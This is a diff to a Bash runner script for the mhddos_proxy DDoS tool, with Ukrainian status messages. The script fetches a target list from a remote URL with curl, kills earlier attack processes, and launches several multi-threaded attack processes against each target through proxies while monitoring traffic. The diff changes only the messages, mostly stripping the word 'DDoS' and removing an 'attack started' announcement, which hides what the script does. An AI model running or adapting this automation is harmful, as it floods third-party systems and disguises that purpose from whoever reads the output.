@@ -76,7 +76,7 @@ PROXY_PROJECT_VERSION=addeea253d53bbf90d0a320367d8974183c4b480
 PROXY_DIR=~/$PROXY_PROJECT_NAME
 PROXY_FILE=$PROXY_DIR/mhddos/files/proxies/proxies.txt
 
-echo "Підготовка середовища для запуску DDoS..."
+echo "Підготовка середовища для запуску..."
 
 # make sure ifstat and awk are installed
 apt-get install ifstat gawk -y &> /dev/null
@@ -101,17 +101,17 @@ git checkout $PROXY_PROJECT_VERSION &> /dev/null
 # install mhddos_proxy dependencies
 python3 -m pip install -r requirements.txt &> /dev/null
 
-echo "Підготовка середовища для запуску DDoS... ГОТОВО!"
+echo "Підготовкy середовища для запуску завершено"
 
 # Restart attacks and update targets every $refresh_interval
 while true
 do
     # kill old copies of mhddos_proxy
-    echo "DDoS (ре)стартує. Завершення попередніх процесів..."
+    echo "(ре)старт програми..."
     if pgrep -f runner.py &> /dev/null; then pkill -f runner.py &> /dev/null; fi
     if pgrep -f ./start.py &> /dev/null; then pkill -f /start.py &> /dev/null; fi
     if pgrep -f ifstat &> /dev/null; then pkill -f ifstat &> /dev/null; fi
-    echo "(ре)старт DDoS завершено"
+    echo "(ре)старт програми завершено"
 
     # delete old proxy file if present
     if [ -f $PROXY_FILE ]; then
@@ -120,7 +120,7 @@ do
 
     # load targets and process them one-by-one
     curl -s $url_with_targets | cat | grep "^[^#]" | while read -r target_command ; do
-      echo "Запускаємо $process_count процесів для атаки $target_command, з $thread_count потоками"
+      echo "Запускаємо атаку на $target_command, задіявши $process_count процесів, кожний з $thread_count потоками"
 
       for (( i=1; i<=process_count; i++ ))
       do
@@ -129,19 +129,17 @@ do
 
           # wait till the first process initializes proxy file properly
           if [ ! -f $PROXY_FILE ]; then
-              echo "Підготовка та перевірка проксі. Це може зайняти декілька хвилин..."
+              echo "Перевірка проксі. Це може зайняти декілька хвилин..."
 
               while [ ! -f $PROXY_FILE ]
               do
                   sleep 1
               done
 
-              echo "Підготовку на перевірку проксі завершено"
+              echo "Перевірку проксі завершено"
           fi
       done
   done
-
-  echo -e "DDoS атака почалася. Активовано моніторинг трафіку на інтерфейсі eth0 (відображається поточний час, вхідна та вихідна швидкість у MB за секунду).\nНаступна перевірка цілей відбудеться через $refresh_interval\n"
 
   ifstat -i eth0 -t -b -n $stats_interval/$stats_interval | awk '$1 ~ /^[0-9]{2}:/{$2/=1024;$3/=1024;printf "[%s] %10.2f ↓MBit/s↓  %10.2f ↑MBit/s↑\n",$1,$2,$3}'&
 
